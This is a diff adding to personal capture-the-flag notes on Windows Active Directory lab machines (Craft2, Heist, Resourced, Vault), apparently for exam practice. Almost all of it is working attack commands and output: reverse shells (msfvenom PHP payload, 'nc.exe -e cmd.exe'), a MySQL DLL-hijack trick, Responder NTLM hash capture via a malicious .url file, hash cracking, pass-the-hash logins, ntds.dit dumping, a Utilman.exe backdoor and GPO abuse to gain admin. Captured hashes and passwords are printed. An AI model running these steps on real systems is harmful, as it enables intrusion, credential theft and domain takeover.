@@ -557,8 +557,11 @@ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt craft2hash
 winniethepooh    (thecybergeek) 
 ```
 
-4. Foothold. Upload msfvenom reverse shell. Obtained local.txt
+4. Foothold. Upload msfvenom reverse shell in smbclient. Obtained local.txt
 ```
+enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" 192.168.187.188
+
+
 msfvenom -p php/reverse_php LHOST=192.168.45.153 LPORT=4449 -o s.php
 
 http://192.168.223.188/s.php
@@ -570,11 +573,133 @@ connect to [192.168.45.153] from (UNKNOWN) [192.168.223.188] 49797
 whoami
 craft2\apache
 PS C:\xampp\htdocs> 
+
+Make sure to get another proper shell
 ```
 
+5. Everything for privilege escalation. 
+```
+chisel server -p 8000 --reverse
+
+.\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
+
+mysql -u root -h 127.0.0.1
+select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
+select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
+
+C:\test>WerTrigger.exe
+WerTrigger.exe
+C:\test\nc.exe 192.168.213.128 445 -e cmd.exe
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 445
+```
 ## Heist
+1. Rustscan and Nmap
+```
+53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,8080,9389,49666,49669,49673,49674,49677,49705,49759
 
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-11 04:44:17Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: HEIST
+|   NetBIOS_Domain_Name: HEIST
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: heist.offsec
+|   DNS_Computer_Name: DC01.heist.offsec
+|   DNS_Tree_Name: heist.offsec
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-04-11T04:45:06+00:00
+| ssl-cert: Subject: commonName=DC01.heist.offsec
+| Not valid before: 2024-03-22T06:03:39
+|_Not valid after:  2024-09-21T06:03:39
+|_ssl-date: 2024-04-11T04:45:46+00:00; +1s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
+|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
+|_http-title: Super Secure Web Browser
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49705/tcp open  msrpc         Microsoft Windows RPC
+49759/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-04-11T04:45:09
+|_  start_date: N/A
+```
+
+2. Start Responder and get response from port 8080
+```
+sudo responder -I tun0 -v
+
+type this in port 8080 page:  http://kaliIP/
+
+capture ntlmv2 hash: 
+enox::HEIST:415b85fdeb39d439:C94A6844A819C686DBDBEB21F7C5590A:0101000000000000B8A6BB0CCB8BDA017FEBB2F7A2F496900000000002000800560035005100380001001E00570049004E002D004A0058004300450031004C005900420037004F004F000400140056003500510038002E004C004F00430041004C0003003400570049004E002D004A0058004300450031004C005900420037004F004F002E0056003500510038002E004C004F00430041004C000500140056003500510038002E004C004F00430041004C00080030003000000000000000000000000030000003C871E315B08F3D0B7DFAFEBB99708690E3368808ADAA080B07C99914FB52C40A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003200340039000000000000000000 
+```
+
+3. Crack it and log in. 
+```
+hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt --force
+
+crackmapexec winrm 192.168.187.165 -u enox -p california -d heist.offsec 
+
+evil-winrm  -i 192.168.187.165 -u enox -p 'california' 
+
+*Evil-WinRM* PS C:\Users\enox\Desktop> cat local.txt
+7f6c4af1036fb4573b4053a28b6c0451
+```
+
+4. Enumerating user enox, checking out groups through bloodhound. Able to move laterally to svc_apache. 
+```
+net user enox
+
+net localgroup administrators
+
+Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
+
+.\GMSAPasswordReader.exe --AccountName 'svc_apache'
+```
+
+5. Privilege escalation (SeRestorePrivilege)
+```
+evil-winrm -i 192.168.187.165 -u svc_apache$ -H DA55A6102C791A052798C4B7EF6C0122
+
+*Evil-WinRM* PS C:\Windows\system32> ren Utilman.exe Utilman.old
+*Evil-WinRM* PS C:\Windows\system32> ren cmd.exe Utilman.exe
+```
+
+6. Obtained proof.txt
+```
+1. rdesktop 192.168.187.165
+
+2. ctrl + U
+
+3. type C:\Users\Administrator\Desktop\proof.txt
+```
 
 ## Hutch
 1. Rustscan
@@ -1021,8 +1146,82 @@ e66bdd81463b7c3c11551b66d205c102
 
 
 ## Resourced
+1. Rustscan and Nmap
+```
+53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49674,49675,49693,49712 192.168.187
 
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-11 00:24:26Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+| Not valid before: 2024-03-21T10:42:07
+|_Not valid after:  2024-09-20T10:42:07
+|_ssl-date: 2024-04-11T00:25:56+00:00; +1s from scanner time.
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-04-11T00:25:16+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49712/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+| smb2-time: 
+|   date: 2024-04-11T00:25:17
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+```
+
+2. Enum4linux
+```
+enum4linux -a -u '' -p '' 192.168.187.175
+
+index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)       Desc: New-hired, reminder: HotelCalifornia194!
+```
+
+3. Download SYSTEM and ndts.dit
+```
+smbclient \\\\192.168.187.175\\'Password Audit' -U 'V.Ventz'
+
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL 
+```
+
+4. Figure out the right user and hashes for winrm
+```
+crackmapexec winrm 192.168.187.175 -u user -H hashes -d resourced.local 
+
+WINRM       192.168.187.175 5985   192.168.187.175  [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
+```
+
+5. Obtained local.txt from winrm. 
+```
+evil-winrm  -i 192.168.187.175 -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+```
 
 ## Squid
 1. Rustscan
@@ -1135,4 +1334,131 @@ nt authority\system
 PS C:\Users\Administrator\Desktop> type proof.txt
 type proof.txt
 d3f9bc6bbc47f05aa316f425e9cc57a9
+```
+
+
+## Vault
+
+1. Rustscan and Nmap 
+```
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-12 03:20:09Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: VAULT
+|   NetBIOS_Domain_Name: VAULT
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: vault.offsec
+|   DNS_Computer_Name: DC.vault.offsec
+|   DNS_Tree_Name: vault.offsec
+|   Product_Version: 10.0.17763
+|_  System_Time: 2024-04-12T03:20:59+00:00
+| ssl-cert: Subject: commonName=DC.vault.offsec
+| Not valid before: 2024-03-22T12:00:33
+|_Not valid after:  2024-09-21T12:00:33
+|_ssl-date: 2024-04-12T03:21:39+00:00; 0s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49680/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49813/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-04-12T03:21:00
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+```
+
+2. Check out smbclient, upload a file with that give hashes with responder. 
+```
+smbclient -N -L 192.168.120.116
+smbclient -N //192.168.120.116/DocumentsShare
+
+cat @hax.url 
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\192.168.118.14\%USERNAME%.icon
+IconIndex=1
+
+smb: \> put @hax.url 
+
+sudo responder -I tap0 -v
+
+anirudh::VAULT:9def1316e1c05550:0AF01C475AFD7AD30D439711296603FC:010100000000000000C8C8F445DDD70175319E0B50E5D26C0000000002000800410031005900380001001E00570049004E002D004C00580033003800430030004B004C00350047005A0004003400570049004E002D004C00580033003800430030004B004C00350047005A002E0041003100590038002E004C004F00430041004C000300140041003100590038002E004C004F00430041004C000500140041003100590038002E004C004F00430041004C000700080000C8C8F445DDD7010600040002000000080030003000000000000000010000000020000024B3687DE76994B1C5B750504A62A0055473E634299355A166AE72D58CD7F8660A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E003100310038002E00310034000000000000000000:SecureHM  
+```
+
+3. Evil winrm login and upload powerview.ps1. Run it. 
+```
+ evil-winrm -i 192.168.187.172 -u anirudh -p "SecureHM" 
+*Evil-WinRM* PS C:\Users\anirudh\Documents> dir
+    Directory: C:\Users\anirudh\Documents
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/11/2024   8:27 PM         770273 PowerView.ps1
+```
+
+4. List GPO and get ID. 
+```
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPO -Name "Default Domain Policy
+DisplayName      : Default Domain Policy
+DomainName       : vault.offsec
+Owner            : VAULT\Domain Admins
+Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
+GpoStatus        : AllSettingsEnabled
+Description      :
+CreationTime     : 11/19/2021 12:50:33 AM
+ModificationTime : 11/19/2021 2:00:32 AM
+UserVersion      : AD Version: 0, SysVol Version: 0
+ComputerVersion  : AD Version: 4, SysVol Version: 4
+WmiFilter        :
+```
+
+5. Figure out GPO ID permissions 
+```
+*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-00C04FB984F9 -TargetType User -TargetName anirudh
+Trustee     : anirudh
+TrusteeType : User
+Permission  : GpoEditDeleteModifySecurity
+Inherited   : False
+```
+
+6. GPO Abuse via SharpGPOAbuse
+```
+wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe
+
+*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
+
+gpupdate /force
+
+net localgroup Administrators
+```
+
+7. Impacket login and obtained proof. 
+```
+python3 /usr/share/doc/python3-impacket/examples/psexec.py vault.offsec/anirudh:SecureHM@192.168.120.116
+
+C:\Windows\system32> whoami
+nt authority\system
 ```
